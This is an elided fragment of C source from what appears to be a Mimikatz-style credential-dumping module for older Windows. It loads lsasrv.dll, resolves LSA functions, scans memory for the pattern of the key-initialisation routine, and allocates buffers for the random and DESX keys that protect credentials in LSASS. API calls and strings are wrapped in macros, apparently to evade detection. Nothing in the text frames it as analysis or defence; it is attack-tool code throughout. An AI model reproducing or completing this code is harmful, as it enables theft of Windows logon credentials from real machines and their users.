...
NTSTATUS kuhl_m_sekurlsa_nt5_init()
{
	...
	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt5_KeyInit))
	{
		if(!kuhl_m_sekurlsa_nt5_hLsasrv)
			kuhl_m_sekurlsa_nt5_hLsasrv = API(KERNEL32, LoadLibraryW)(_WCS_("lsasrv"));
		
		if(kuhl_m_sekurlsa_nt5_hLsasrv)
		{
			if(kull_m_process_getVeryBasicModuleInformationsForName(&hMemory, _WCS_("lsasrv.dll"), &vbInfos))
			{
				...
				{
					if(
					(extractPkgFunctionTable.LsaICancelNotification = API(KERNEL32, GetProcAddress)(kuhl_m_sekurlsa_nt5_hLsasrv, _CS_("LsaICancelNotification"))) &&
					(extractPkgFunctionTable.LsaIRegisterNotification = API(KERNEL32, GetProcAddress)(kuhl_m_sekurlsa_nt5_hLsasrv, _CS_("LsaIRegisterNotification")))
					)
					{
				...
				if(kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
				{
					...
					if(kull_m_memory_search(&aMemory, sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY), &sMemory, FALSE))
					{
						...
						{
							*g_cbRandomKey	= 256;
							*g_pRandomKey	= (PBYTE) API(KERNEL32, LocalAlloc)(LPTR, *g_cbRandomKey);
							*g_pDESXKey		= (PBYTE) API(KERNEL32, LocalAlloc)(LPTR, 144);
...
{
	if(g_pRandomKey)
		API(KERNEL32, LocalFree)(*g_pRandomKey);
	if(g_pDESXKey)
		API(KERNEL32, LocalFree)(*g_pDESXKey);
	if(kuhl_m_sekurlsa_nt5_hLsasrv)
		API(KERNEL32, FreeLibrary)(kuhl_m_sekurlsa_nt5_hLsasrv);
